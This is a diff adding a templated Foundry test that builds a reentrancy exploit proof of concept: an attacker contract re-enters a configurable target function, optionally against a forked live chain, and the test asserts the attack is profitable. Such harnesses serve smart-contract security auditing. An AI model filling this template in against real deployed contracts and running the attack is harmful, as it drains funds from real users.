@@ -1,0 +1,97 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^{{ solc_version | default("0.8.20") }};
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+
+interface ITarget {
+    function {{ target_function }}({{ target_function_args | default("") }}) external payable;
+}
+
+contract Attacker {
+    ITarget public target;
+    uint256 public reentryCount;
+    uint256 public maxReentries;
+
+    constructor(address _target, uint256 _maxReentries) {
+        target = ITarget(_target);
+        maxReentries = _maxReentries;
+    }
+
+    function attack() external payable {
+        target.{{ target_function }}{{ "{" }}value: msg.value{{ "}" }}({{ attack_args | default("") }});
+    }
+
+    receive() external payable {
+        if (reentryCount < maxReentries) {
+            reentryCount++;
+            target.{{ target_function }}({{ attack_args | default("") }});
+        }
+    }
+
+    fallback() external payable {
+        if (reentryCount < maxReentries) {
+            reentryCount++;
+            target.{{ target_function }}({{ attack_args | default("") }});
+        }
+    }
+}
+
+contract ReentrancyExploitTest is Test {
+    ITarget public target;
+    Attacker public attacker;
+
+    {% if fork_url %}
+    uint256 internal fork;
+    {% endif %}
+
+    function setUp() public {
+        {% if fork_url %}
+        fork = vm.createSelectFork(
+            "{{ fork_url }}"{% if fork_block %},
+            {{ fork_block }}{% endif %}
+
+        );
+        {% endif %}
+
+        target = ITarget({{ target_contract }});
+        attacker = new Attacker(address(target), {{ max_reentries | default("3") }});
+
+        vm.label(address(target), "Target");
+        vm.label(address(attacker), "Attacker");
+    }
+
+    function test_reentrancy_exploit() public {
+        {% if attack_token %}
+        // Snapshot token balance before attack
+        uint256 balBefore = _balanceOf({{ attack_token }}, address(attacker));
+        {% else %}
+        // Snapshot ETH balance before attack
+        uint256 balBefore = address(attacker).balance;
+        {% endif %}
+
+        // Fund attacker
+        vm.deal(address(attacker), {{ attack_value | default("1 ether") }});
+
+        // Execute attack
+        attacker.attack{{ "{" }}value: {{ attack_value | default("1 ether") }}{{ "}" }}();
+
+        {% if attack_token %}
+        uint256 balAfter = _balanceOf({{ attack_token }}, address(attacker));
+        {% else %}
+        uint256 balAfter = address(attacker).balance;
+        {% endif %}
+
+        uint256 profit = balAfter - balBefore;
+        console.log("Profit:", profit);
+        assertGt(profit, 0, "Exploit should be profitable");
+    }
+
+    function _balanceOf(address token, address account) internal view returns (uint256) {
+        (bool ok, bytes memory data) = token.staticcall(
+            abi.encodeWithSignature("balanceOf(address)", account)
+        );
+        require(ok, "balanceOf failed");
+        return abi.decode(data, (uint256));
+    }
+}
